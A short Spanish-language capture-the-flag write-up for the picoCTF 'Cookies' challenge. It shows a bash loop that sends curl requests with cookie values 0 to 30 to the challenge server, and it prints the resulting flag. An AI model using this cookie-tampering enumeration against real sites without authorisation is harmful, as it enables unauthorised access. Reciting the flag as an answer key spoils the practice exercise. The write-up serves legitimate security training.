## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

## Solución
Al entrar y agregar una cookie nos damos cuenta de que cada cookie tene un numero designado. La forma tardada de resolver el reto es probar con todas las cookies pero se puede hacer mas rapido con una terminal de esta forma:


```bash
┌──(ulrich㉿DasMausoleum)-[~]
└─$ for i in {0..30}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
                                                                                
┌──(ulrich㉿DasMausoleum)-[~]
└─$ 

```

### picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
## Notas adicionales
## Referencias
